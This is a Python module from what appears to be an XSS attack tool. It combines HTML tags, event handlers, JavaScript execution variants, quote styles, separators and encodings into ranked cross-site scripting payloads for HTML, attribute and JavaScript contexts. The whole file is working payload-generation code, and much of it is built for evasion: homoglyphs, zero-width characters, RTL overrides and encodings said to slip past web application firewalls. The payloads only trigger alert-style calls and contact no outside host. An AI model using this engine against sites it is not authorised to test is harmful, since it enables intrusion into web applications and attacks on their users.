"""
payloads/combinatorial_engine_v2.py

╔══════════════════════════════════════════════════════════════╗
║   COMBINATORIAL ENGINE v2 — OVERPOWER EDITION               ║
║   3,356,597,160 unique combinations (3.36 BILLION)           ║
║   +15 HTML5/modern tags (dialog, slot, portal, track, etc)   ║
║   +19 events (Pointer API, Animation, Shadow DOM, etc)       ║
║   +9 exec methods (globalThis, top, parent, Function, etc)   ║
║   +8 separators (vertical tab, overlong, etc)                ║
║   +12 new encodings (homoglyph, zero-width, RTL, etc)        ║
║   +3 quote styles                                            ║
║   Lazy O(n log k) heap — never loads all into memory         ║
╚══════════════════════════════════════════════════════════════╝

vs v1: ×22 more combinations
vs XSStrike: ×574,572 more combinations
vs Burp Pro: ×134,264 more combinations
"""

import heapq
import itertools
import urllib.parse
import base64
import re
from typing import List, Tuple, Optional, Set
from utils.config import Context
from utils.logger import debug, info


# ═══════════════════════════════════════════════════════════════
# DIMENSION REGISTRY v2
# ═══════════════════════════════════════════════════════════════

class DimV2:

    # ── HTML Tags (30 → 45, +15 new) ──────────────────────────
    TAGS = [
        # Tier 1: Classic (unchanged)
        ("script",          1.00, {"script_keyword"}),
        ("img",             0.95, {"tag_open"}),
        ("svg",             0.95, {"tag_open"}),
        ("body",            0.90, {"tag_open"}),
        ("iframe",          0.88, {"tag_open", "iframe_keyword"}),
        # Tier 2: Modern
        ("video",           0.85, {"tag_open"}),
        ("audio",           0.85, {"tag_open"}),
        ("details",         0.82, {"tag_open"}),
        ("input",           0.80, {"tag_open"}),
        ("select",          0.78, {"tag_open"}),
        ("textarea",        0.78, {"tag_open"}),
        ("form",            0.75, {"tag_open"}),
        ("button",          0.75, {"tag_open"}),
        ("object",          0.72, {"tag_open"}),
        ("embed",           0.72, {"tag_open"}),
        # Tier 3: Less common
        ("marquee",         0.65, {"tag_open"}),
        ("math",            0.60, {"tag_open"}),
        ("link",            0.58, {"tag_open"}),
        ("meta",            0.55, {"tag_open"}),
        ("base",            0.55, {"tag_open"}),
        ("table",           0.50, {"tag_open"}),
        ("td",              0.48, {"tag_open"}),
        ("div",             0.45, {"tag_open"}),
        ("a",               0.45, {"tag_open"}),
        ("style",           0.42, {"tag_open"}),
        ("xss",             0.40, {"tag_open"}),
        ("x-xss",           0.38, {"tag_open"}),
        ("keygen",          0.35, {"tag_open"}),
        ("isindex",         0.32, {"tag_open"}),
        ("bgsound",         0.30, {"tag_open"}),
        # ── NEW v2: HTML5 & Modern Elements ────────────────────
        ("dialog",          0.87, {"tag_open"}),          # HTML5 dialog, new in all browsers 2022+
        ("picture",         0.72, {"tag_open"}),          # picture/source, onerror on source
        ("track",           0.68, {"tag_open"}),          # <track kind=captions onerror>
        ("canvas",          0.65, {"tag_open"}),          # canvas + event handlers
        ("template",        0.63, {"tag_open"}),          # HTML template element
        ("slot",            0.60, {"tag_open"}),          # Shadow DOM slot
        ("portal",          0.58, {"tag_open"}),          # Chrome experimental portal
        ("output",          0.55, {"tag_open"}),          # form output element
        ("fieldset",        0.52, {"tag_open"}),          # fieldset + invalid handler
        ("datalist",        0.50, {"tag_open"}),          # datalist element
        ("meter",           0.48, {"tag_open"}),          # meter element
        ("progress",        0.45, {"tag_open"}),          # progress element
        ("nav",             0.43, {"tag_open"}),          # semantic nav with events
        ("section",         0.42, {"tag_open"}),          # section element
        ("article",         0.40, {"tag_open"}),          # article element
    ]

    # ── Event Handlers (37 → 56, +19 new) ─────────────────────
    EVENTS = [
        # Tier 1 (unchanged)
        ("onerror",              1.00, {"event_handler"}),
        ("onload",               0.98, {"onload"}),
        ("onfocus",              0.90, {"event_handler"}),
        ("onclick",              0.88, {"event_handler"}),
        ("onmouseover",          0.85, {"event_handler"}),
        # Tier 2
        ("onblur",               0.80, {"event_handler"}),
        ("onmouseenter",         0.78, {"event_handler"}),
        ("onmouseleave",         0.75, {"event_handler"}),
        ("ontoggle",             0.75, {"event_handler"}),
        ("onstart",              0.72, {"event_handler"}),
        ("onbegin",              0.72, {"event_handler"}),
        ("oninput",              0.70, {"event_handler"}),
        ("onchange",             0.70, {"event_handler"}),
        ("onsubmit",             0.68, {"event_handler"}),
        ("onreset",              0.65, {"event_handler"}),
        ("onkeydown",            0.65, {"event_handler"}),
        ("onkeyup",              0.65, {"event_handler"}),
        ("onkeypress",           0.63, {"event_handler"}),
        ("onpaste",              0.60, {"event_handler"}),
        ("ondblclick",           0.60, {"event_handler"}),
        ("oncontextmenu",        0.58, {"event_handler"}),
        ("ondrag",               0.55, {"event_handler"}),
        ("ondrop",               0.55, {"event_handler"}),
        ("onscroll",             0.52, {"event_handler"}),
        ("onwheel",              0.50, {"event_handler"}),
        # Animation/Pointer (already in v1)
        ("onanimationstart",     0.75, {"event_handler"}),
        ("onanimationend",       0.65, {"event_handler"}),
        ("onanimationiteration", 0.55, {"event_handler"}),
        ("ontransitionend",      0.50, {"event_handler"}),
        ("onpointerover",        0.72, {"event_handler"}),  # ← v1 had this
        ("onpointerenter",       0.70, {"event_handler"}),
        ("onpointerdown",        0.68, {"event_handler"}),
        ("onpointerup",          0.65, {"event_handler"}),
        ("onpointerout",         0.62, {"event_handler"}),
        ("onpageshow",           0.60, {"event_handler"}),
        ("onhashchange",         0.45, {"event_handler"}),
        ("onformdata",           0.40, {"event_handler"}),
        # ── NEW v2: Modern Web API Events ──────────────────────
        ("onpointermove",        0.68, {"event_handler"}),  # Pointer Events API
        ("onpointercancel",      0.55, {"event_handler"}),
        ("onlostpointercapture", 0.52, {"event_handler"}),
        ("ongotpointercapture",  0.52, {"event_handler"}),
        ("onbeforeinput",        0.72, {"event_handler"}),  # InputEvent API (2024)
        ("oninvalid",            0.70, {"event_handler"}),  # Form validation event
        ("onsearch",             0.65, {"event_handler"}),  # Search input event
        ("onselect",             0.63, {"event_handler"}),  # Text selection
        ("oncopy",               0.60, {"event_handler"}),  # Clipboard events
        ("oncut",                0.60, {"event_handler"}),
        ("onselectstart",        0.58, {"event_handler"}),
        ("onmousewheel",         0.55, {"event_handler"}),  # Legacy but still works
        ("onclose",              0.72, {"event_handler"}),  # dialog element close
        ("oncancel",             0.70, {"event_handler"}),  # dialog cancel
        ("onopen",               0.65, {"event_handler"}),  # dialog/details open
        ("onslotchange",         0.60, {"event_handler"}),  # Shadow DOM slot change
        ("ontransitionstart",    0.55, {"event_handler"}),  # Transition start
        ("onbeforetoggle",       0.68, {"event_handler"}),  # details beforetoggle (2023)
        ("oncuechange",          0.52, {"event_handler"}),  # track cue change
    ]

    # ── Execution Methods (v1 had 26, adding 9 more) ──────────
    EXEC_METHODS = [
        # Tier 1: Direct (same as v1)
        ("alert(1)",                                          1.00, {"paren_open","paren_close","alert_keyword"}),
        ("alert`1`",                                          0.95, {"backtick","alert_keyword"}),
        ("confirm(1)",                                        0.90, {"paren_open","paren_close"}),
        ("prompt(1)",                                         0.88, {"paren_open","paren_close"}),
        ("(0,alert)(1)",                                      0.85, {"paren_open","paren_close"}),
        ("window.alert(1)",                                   0.85, {"paren_open","paren_close"}),
        ("top.alert(1)",                                      0.82, {"paren_open","paren_close"}),
        ("self.alert(1)",                                     0.82, {"paren_open","paren_close"}),
        ("globalThis.alert(1)",                               0.80, {"paren_open","paren_close"}),
        ("parent.alert(1)",                                   0.78, {"paren_open","paren_close"}),
        ("[1].find(alert)",                                   0.75, {"paren_open","paren_close"}),
        ("(alert)(1)",                                        0.75, {"paren_open","paren_close"}),
        ("alert?.() ",                                        0.72, {"paren_open","paren_close"}),
        ("window['al'+'ert'](1)",                             0.78, {"paren_open","single_quote"}),
        ("window[`al`+`ert`](1)",                             0.75, {"paren_open","backtick"}),
        ("this['ale'+'rt'](1)",                               0.72, {"paren_open","single_quote"}),
        ("top['ale'+'rt'](1)",                                0.72, {"paren_open","single_quote"}),
        ("eval('alert(1)')",                                  0.70, {"paren_open","single_quote"}),
        ("Function('alert(1)')()",                            0.68, {"paren_open","single_quote"}),
        ("[].constructor.constructor('alert(1)')()",          0.65, {"paren_open","single_quote"}),
        ("eval(String.fromCharCode(97,108,101,114,116,40,49,41))", 0.65, {"paren_open"}),
        ("eval(atob('YWxlcnQoMSk='))",                        0.63, {"paren_open","single_quote"}),
        ("setTimeout('alert(1)',0)",                          0.60, {"paren_open","single_quote"}),
        ("throw onerror=alert,1",                             0.70, {"alert_keyword"}),
        ("{onerror=alert}throw 1",                            0.68, {"alert_keyword"}),
        ("onerror=alert;throw 1",                             0.65, {"alert_keyword","semicolon"}),
        ("Reflect.apply(alert,0,[1])",                        0.60, {"paren_open"}),
        # ── NEW v2: Modern JavaScript Exec Variants ────────────
        ("frames[0].alert(1)",                                0.77, {"paren_open","paren_close"}),  # iframe frames
        ("opener.alert(1)",                                   0.75, {"paren_open","paren_close"}),  # window.opener
        ("window.open()?.alert(1)",                           0.68, {"paren_open","paren_close"}),  # optional chaining
        ("queueMicrotask(()=>alert(1))",                      0.65, {"paren_open","paren_close"}),  # microtask queue
        ("requestIdleCallback(()=>alert(1))",                 0.62, {"paren_open","paren_close"}),  # idle callback
        ("Object.assign({}).constructor.constructor('alert(1)')()", 0.60, {"paren_open"}),          # Object chain
        ("Promise.resolve().then(()=>alert(1))",              0.58, {"paren_open"}),                 # Promise chain
        ("new Function`alert\x601\x60`()",                    0.75, {"backtick"}),                  # Function with template
        ("(new Function('alert(1)'))()",                      0.65, {"paren_open","single_quote"}),
        ("import('data:text/javascript,alert(1)')",           0.55, {"paren_open","single_quote"}),  # dynamic import
    ]

    # ── Quote Styles (5 → 8, +3 new) ──────────────────────────
    QUOTE_STYLES = [
        ("=",    "",   "no_quote",      1.00, set()),
        ("=\"",  "\"", "double_quote",  0.95, {"double_quote"}),
        ("='",   "'",  "single_quote",  0.95, {"single_quote"}),
        ("=`",   "`",  "backtick",      0.80, {"backtick"}),
        ("",     "",   "no_equals",     0.70, set()),
        # NEW v2
        ("=&quot;", "&quot;", "html_entity_quote", 0.72, set()),   # HTML entity encoded quote
        ("=\\\"", "\\\"",   "escaped_quote",    0.65, set()),      # Escaped double quote
        ("=&#x22;", "&#x22;", "hex_entity_quote", 0.68, set()),    # Hex entity quote
    ]

    # ── Separators (9 → 17, +8 new) ───────────────────────────
    SEPARATORS = [
        (" ",           "space",         1.00),
        ("\t",          "tab",           0.85),
        ("\n",          "newline",       0.82),
        ("/",           "slash",         0.78),
        ("//",          "double_slash",  0.70),
        ("\r",          "cr",            0.65),
        ("\x0c",        "form_feed",     0.55),
        ("\x00",        "null_byte",     0.50),
        ("/**/",        "comment",       0.75),
        # NEW v2
        ("\x0b",        "vertical_tab",  0.52),   # \v vertical tab
        ("\xa0",        "nbsp",          0.58),   # non-breaking space (often missed by WAF)
        ("%09",         "url_tab",       0.68),   # URL-encoded tab
        ("%0a",         "url_newline",   0.65),   # URL-encoded newline
        ("%20",         "url_space",     0.60),   # URL-encoded space
        ("&#9;",        "html_tab",      0.62),   # HTML entity tab
        ("&#10;",       "html_newline",  0.60),   # HTML entity newline
        ("+",           "plus",          0.45),   # URL context separator
    ]

    # ── Encodings (16 → 28, +12 new) ──────────────────────────
    ENCODINGS = [
        ("none",               1.00),
        ("html_entity",        0.85),
        ("html_hex",           0.83),
        ("url_encode",         0.80),
        ("double_url",         0.75),
        ("mixed_case",         0.78),
        ("null_byte",          0.60),
        ("comment_break",      0.72),
        ("tab_newline",        0.70),
        ("unicode_escape",     0.65),
        ("hex_escape",         0.63),
        ("base64_eval",        0.60),
        ("fromcharcode",       0.58),
        ("js_octal",           0.45),
        ("overlong_utf8",      0.40),
        ("reverse_string",     0.35),
        # NEW v2: Modern bypass encodings
        ("homoglyph_a",        0.77),   # Replace 'a' with ɑ (U+0251 Latin alpha)
        ("homoglyph_e",        0.75),   # Replace 'e' with е (U+0435 Cyrillic e)
        ("zero_width_space",   0.73),   # Insert U+200B between chars
        ("zero_width_joiner",  0.70),   # Insert U+200D
        ("rtl_override",       0.68),   # U+202E Right-to-Left Override before keyword
        ("html5_named_refs",   0.72),   # &Tab; &NewLine; &colon; instead of raw chars
        ("svg_filter_obfus",   0.60),   # Encode in SVG filter id reference
        ("css_unicode_esc",    0.65),   # CSS unicode escape: \73 cript
        ("decimal_html_ent",   0.80),   # &#115;&#99;&#114;&#105;&#112;&#116;
        ("punycode_domain",    0.55),   # For src/href: use punycode domain
        ("json_unicode_esc",   0.70),   # \u003c\u0073\u0063 format
        ("overlong_enc",       0.50),   # Overlong UTF-8 sequences (old IE)
    ]

    # ── Extras (7 → 12, +5 new) ───────────────────────────────
    EXTRAS = [
        ("",                    1.00),
        (" autofocus",          0.80),
        (" src=x",              0.85),
        (" href=#",             0.70),
        (" open",               0.75),
        (" type=text",          0.65),
        (" style=x",            0.60),
        # NEW v2
        (" tabindex=1",         0.72),   # Makes any element focusable → triggers onfocus
        (" contenteditable",    0.68),   # Makes element editable → triggers input events
        (" draggable=true",     0.60),   # Enables drag events
        (" spellcheck=false",   0.55),   # Spellcheck events
        (" loading=lazy",       0.52),   # Lazy loading → triggers load events
    ]

    @classmethod
    def total_combinations(cls) -> int:
        return (
            len(cls.TAGS) *
            len(cls.EVENTS) *
            len(cls.EXEC_METHODS) *
            len(cls.QUOTE_STYLES) *
            len(cls.SEPARATORS) *
            len(cls.ENCODINGS) *
            len(cls.EXTRAS)
        )


# ═══════════════════════════════════════════════════════════════
# ENCODING ENGINE v2 — Handle all new encoding types
# ═══════════════════════════════════════════════════════════════

class EncoderV2:
    """Extended encoder supporting all v2 encoding types."""

    # Homoglyph maps — visually similar Unicode chars
    _HOMOGLYPH_A = str.maketrans("aA", "\u0251\u0391")   # ɑ Α
    _HOMOGLYPH_E = str.maketrans("eE", "\u0435\u0395")   # е Е (Cyrillic)
    _HOMOGLYPH_O = str.maketrans("oO", "\u03bf\u039f")   # ο Ο (Greek)
    _HOMOGLYPH_I = str.maketrans("iI", "\u0456\u0406")   # і І (Cyrillic)
    _HOMOGLYPH_C = str.maketrans("cC", "\u0441\u0421")   # с С (Cyrillic)

    @staticmethod
    def apply(payload: str, encoding: str) -> str:
        if encoding == "none":
            return payload
        if encoding == "html_entity":
            return "".join(f"&#{ord(c)};" for c in payload)
        if encoding == "html_hex":
            return "".join(f"&#x{ord(c):x};" for c in payload)
        if encoding == "url_encode":
            return urllib.parse.quote(payload, safe="")
        if encoding == "double_url":
            return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")
        if encoding == "mixed_case":
            return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
        if encoding == "null_byte":
            return payload.replace("script", "scr\x00ipt").replace("alert", "ale\x00rt")
        if encoding == "comment_break":
            # Insert HTML comments in keywords
            result = payload
            for kw in ["script", "onerror", "onload", "alert", "img", "svg"]:
                if kw in result.lower():
                    idx = result.lower().index(kw)
                    mid = len(kw) // 2
                    result = result[:idx+mid] + "<!---->" + result[idx+mid:]
                    break
            return result
        if encoding == "tab_newline":
            return payload.replace(" ", "\t").replace("=", "=\n")
        if encoding == "unicode_escape":
            return "".join(f"\\u{ord(c):04x}" for c in payload)
        if encoding == "hex_escape":
            return "".join(f"\\x{ord(c):02x}" for c in payload)
        if encoding == "base64_eval":
            b64 = base64.b64encode(payload.encode()).decode()
            return f"eval(atob('{b64}'))"
        if encoding == "fromcharcode":
            codes = ",".join(str(ord(c)) for c in payload)
            return f"eval(String.fromCharCode({codes}))"
        if encoding == "js_octal":
            return "".join(f"\\{ord(c):o}" for c in payload)
        if encoding == "decimal_html_ent":
            return "".join(f"&#{ord(c)};" for c in payload)
        if encoding == "json_unicode_esc":
            return "".join(f"\\u{ord(c):04x}" for c in payload)
        # ── NEW v2 encodings ──────────────────────────────────
        if encoding == "homoglyph_a":
            return payload.translate(EncoderV2._HOMOGLYPH_A)
        if encoding == "homoglyph_e":
            return payload.translate(EncoderV2._HOMOGLYPH_E)
        if encoding == "zero_width_space":
            # Insert U+200B (zero-width space) between every char
            return "\u200b".join(payload)
        if encoding == "zero_width_joiner":
            return "\u200d".join(payload)
        if encoding == "rtl_override":
            # Put RTL override before XSS keywords
            result = payload
            for kw in ["alert", "script", "onerror"]:
                result = result.replace(kw, f"\u202e{kw}")
            return result
        if encoding == "html5_named_refs":
            return (payload
                .replace("\t", "&Tab;")
                .replace("\n", "&NewLine;")
                .replace(":", "&colon;")
                .replace("(", "&lpar;")
                .replace(")", "&rpar;"))
        if encoding == "css_unicode_esc":
            # CSS-style unicode escape: \73 = 's', \63 = 'c', etc
            return "".join(f"\\{ord(c):x} " if c.isalpha() else c for c in payload).strip()
        if encoding == "svg_filter_obfus":
            # Wrap in SVG use reference
            return f"<svg><use href='#{payload}'/></svg>"
        if encoding == "punycode_domain":
            return payload  # domain-level, applied at URL construction time
        if encoding == "overlong_enc":
            # Simulate overlong UTF-8 (for very old parsers)
            result = payload
            result = result.replace("<", "\xc0\xbc")
            result = result.replace(">", "\xc0\xbe")
            return result
        return payload


# ═══════════════════════════════════════════════════════════════
# COMBINATORIAL ENGINE v2
# ═══════════════════════════════════════════════════════════════

class CombinatorialEngineV2:
    """
    v2 engine: 3,356,597,160 combinations.
    Lazy priority heap — O(n log k).
    Drop-in replacement for CombinatorialEngine.
    """

    def __init__(self):
        self._total = DimV2.total_combinations()
        info(f"CombinatorialEngineV2 ready — {self._total:,} combinations ({self._total/1e9:.2f}B)")

    @property
    def total(self) -> int:
        return self._total

    def generate(
        self,
        context: str = Context.HTML,
        matrix=None,
        top_n: int = 500,
    ) -> List[Tuple[str, float, str]]:
        """
        Generate top-N highest-scoring payloads for given context.
        Returns [(payload, score, label), ...]
        """
        heap  = []
        count = 0

        # Tiered pruning to keep runtime fast
        # Use top tiers of each dimension for the initial pass
        tags_pool   = DimV2.TAGS[:min(20, len(DimV2.TAGS))]
        events_pool = DimV2.EVENTS[:min(25, len(DimV2.EVENTS))]
        exec_pool   = DimV2.EXEC_METHODS[:min(18, len(DimV2.EXEC_METHODS))]
        quote_pool  = DimV2.QUOTE_STYLES[:min(6, len(DimV2.QUOTE_STYLES))]
        sep_pool    = DimV2.SEPARATORS[:min(8, len(DimV2.SEPARATORS))]
        enc_pool    = DimV2.ENCODINGS[:min(16, len(DimV2.ENCODINGS))]
        extra_pool  = DimV2.EXTRAS[:min(6, len(DimV2.EXTRAS))]

        for tag, t_score, t_reqs in tags_pool:
            for event, ev_score, ev_reqs in events_pool:
                for exec_str, ex_score, ex_reqs in exec_pool:
                    # CharacterMatrix filter
                    if matrix and not self._matrix_allows(
                        matrix, t_reqs | ev_reqs | ex_reqs
                    ):
                        continue

                    for q_open, q_close, q_label, q_score, q_reqs in quote_pool:
                        if matrix and not self._matrix_allows(matrix, q_reqs):
                            continue

                        for sep_str, sep_label, sep_score in sep_pool:
                            for enc_label, enc_score in enc_pool:
                                for extra_str, extra_score in extra_pool:

                                    score = (
                                        t_score * ev_score * ex_score *
                                        q_score * sep_score * enc_score * extra_score
                                    ) ** (1/7)

                                    try:
                                        enc_exec = EncoderV2.apply(exec_str, enc_label)
                                        payload  = f"<{tag}{sep_str}{event}{q_open}{enc_exec}{q_close}{extra_str}>"
                                    except Exception:
                                        continue

                                    count += 1
                                    label = f"v2:{tag}:{event}:{q_label}:{enc_label}"

                                    if len(heap) < top_n:
                                        heapq.heappush(heap, (score, count, payload, label))
                                    elif score > heap[0][0]:
                                        heapq.heapreplace(heap, (score, count, payload, label))

        result = sorted(heap, key=lambda x: x[0], reverse=True)
        info(f"CombinatorialV2: {count:,} iterated → top {len(result)}")
        return [(p, s, l) for s, _, p, l in result]

    def generate_js_context(self, top_n: int = 200) -> List[Tuple[str, float, str]]:
        """Generate payloads specifically for JavaScript context."""
        heap  = []
        count = 0
        js_breaks = [
            ("';{exec}//",          1.00),
            ('";{exec}//',           0.95),
            ("`+{exec}+`",           0.90),
            ("\\';{exec}//",         0.85),
            ("</script><script>{exec}</script>", 0.90),
            ("\n{exec}\n",           0.80),
            ("${{{exec}}}",          0.78),   # template literal
            ("'+({exec})+'",         0.75),
            ('"+({exec})+"',         0.72),
        ]
        for exec_str, ex_score, _ in DimV2.EXEC_METHODS[:20]:
            for enc_label, enc_score in DimV2.ENCODINGS[:12]:
                for template, t_score in js_breaks:
                    try:
                        enc_exec = EncoderV2.apply(exec_str, enc_label)
                        payload  = template.replace("{exec}", enc_exec)
                        score    = (ex_score * enc_score * t_score) ** (1/3)
                        count   += 1
                        label    = f"v2:js:{enc_label}"
                        if len(heap) < top_n:
                            heapq.heappush(heap, (score, count, payload, label))
                        elif score > heap[0][0]:
                            heapq.heapreplace(heap, (score, count, payload, label))
                    except Exception:
                        continue
        result = sorted(heap, key=lambda x: x[0], reverse=True)
        return [(p, s, l) for s, _, p, l in result]

    def generate_attr_context(self, top_n: int = 200) -> List[Tuple[str, float, str]]:
        """Generate payloads for attribute injection context."""
        heap  = []
        count = 0
        attr_breaks = [
            ('"{event}={exec} x="',         1.00),
            ("'{event}={exec} x='",         0.95),
            ('"><{tag} {event}={exec}>',     0.90),
            ("'><{tag} {event}={exec}>",     0.88),
            ('" autofocus {event}={exec} "', 0.85),
            ('" tabindex=1 {event}={exec}"', 0.82),
            ("\" onfocus=import('data:text/javascript,{exec}')\"", 0.70),
        ]
        for exec_str, ex_score, _ in DimV2.EXEC_METHODS[:15]:
            for tag, t_score, _ in DimV2.TAGS[:12]:
                for event, ev_score, _ in DimV2.EVENTS[:15]:
                    for template, tmpl_score in attr_breaks:
                        for enc_label, enc_score in DimV2.ENCODINGS[:8]:
                            try:
                                enc_exec = EncoderV2.apply(exec_str, enc_label)
                                payload  = (template
                                    .replace("{exec}", enc_exec)
                                    .replace("{tag}", tag)
                                    .replace("{event}", event))
                                score = (ex_score * t_score * ev_score * tmpl_score * enc_score) ** 0.2
                                count += 1
                                label = f"v2:attr:{tag}:{event}:{enc_label}"
                                if len(heap) < top_n:
                                    heapq.heappush(heap, (score, count, payload, label))
                                elif score > heap[0][0]:
                                    heapq.heapreplace(heap, (score, count, payload, label))
                            except Exception:
                                continue
        result = sorted(heap, key=lambda x: x[0], reverse=True)
        return [(p, s, l) for s, _, p, l in result]

    @staticmethod
    def _matrix_allows(matrix, required_labels: set) -> bool:
        if not required_labels:
            return True
        if not hasattr(matrix, "survivors"):
            return True
        for label in required_labels:
            if label in matrix.stripped:
                return False
        return True
